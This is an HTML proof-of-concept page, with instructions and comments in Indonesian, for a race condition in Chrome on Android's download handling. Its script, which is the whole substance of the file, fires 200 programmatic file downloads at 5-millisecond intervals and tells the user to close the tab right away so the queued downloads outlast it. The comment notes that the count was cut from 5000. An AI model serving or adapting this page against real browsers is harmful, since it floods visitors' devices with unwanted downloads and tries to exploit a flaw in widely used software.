<!DOCTYPE html>
<html>
<head>
    <title>Race Condition PoC - Chrome Android</title>
    <style>
        body { font-family: sans-serif; padding: 20px; text-align: center; }
        .box { border: 2px solid #333; padding: 20px; border-radius: 10px; }
        #status { color: red; font-weight: bold; margin: 10px; }
    </style>
</head>
<body>
    <div class="box">
        <h2>Chrome Android Download Race Condition</h2>
        <p>Instruksi: Klik tombol, lalu <b>SEGERA TUTUP TAB INI</b> dalam 1-2 detik.</p>
        <button id="startBtn" style="padding: 15px; font-size: 1.2rem;">START INJECTION</button>
        <div id="status">Status: Idle</div>
    </div>

    <script>
        document.getElementById('startBtn').onclick = function() {
            const total = 200; // Cukup 200 untuk bukti, jangan 5000 lagi biar aman
            document.getElementById('status').innerText = "INJECTING... CLOSE TAB NOW!";
            
            for (let i = 1; i <= total; i++) {
                setTimeout(() => {
                    const link = document.createElement('a');
                    // Data URI kecil agar cepat masuk ke antrean OS
                    link.href = "data:text/plain;base64,UG9DIFJhY2UgQ29uZGl0aW9u";
                    link.download = `evidence_file_${i}.txt`;
                    
                    document.body.appendChild(link);
                    link.click();
                    document.body.removeChild(link);
                    
                    console.log(`Triggered: ${i}`);
                }, i * 5); // Jeda sangat rapat (5ms) untuk memicu race condition
            }
        };
    </script>
</body>
</html>
